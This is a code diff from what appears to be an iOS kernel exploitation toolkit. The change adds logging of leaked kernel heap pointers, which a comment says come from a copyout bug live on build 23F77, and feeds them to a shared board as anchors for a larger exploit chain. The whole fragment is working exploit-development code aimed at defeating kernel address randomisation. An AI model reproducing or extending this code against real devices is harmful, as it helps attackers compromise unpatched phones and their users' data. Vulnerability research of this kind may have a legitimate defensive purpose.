@@ -31,6 +31,7 @@
 #import "LabDeviceProfile.h"
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
+#import "P007Board.h"
 
 #define P114_BUILD @"p114-surfaceleak-v1.5-banksize"
 
@@ -524,6 +525,17 @@ static void p114_hexdump(size_t maxn) {
                 memcpy(&v30, rec + P114_KV30, 8);   /* +0x30-class client-ptr */
                 BOOL k18 = p114_kernelish(v18), k30 = p114_kernelish(v30);
                 if (k18 || k30) kv++;
+                /* 2026-11-20 GOLDMINE triage (findings:
+                   2026-11-20_goldmine_triage.md): the raw rec+0x18 copyout is
+                   PROVEN LIVE on 23F77 (copy_iosa_activity_entries_to_user —
+                   the only un-addrperm'd field; fixed 23H30/24B156 behind a
+                   byte1 gate). Record every kernel-range hit to the board —
+                   this tap (and the T1's automatic STEP 4b) becomes the 12's
+                   THIRD deterministic anchor source (aio84530, p159, m2scaler).
+                   The board loader's shape gate (kernel-band, same-boot,
+                   boot-uuid provenance) filters any fixed-build noise. */
+                if (k18) @try { [[P007Board shared] recordHeapLeak:v18 source:@"p114_m2scaler"]; } @catch (__unused NSException *e) {}
+                if (k30) @try { [[P007Board shared] recordHeapLeak:v30 source:@"p114_m2scaler"]; } @catch (__unused NSException *e) {}
                 if (i < 4) seen18[c][i] = v18;
                 Lf(@"[cap %d/%d] rec[%d] +0x18=%016llx%s +0x30=%016llx%s",
                    c + 1, P114_CAPTURES, i,
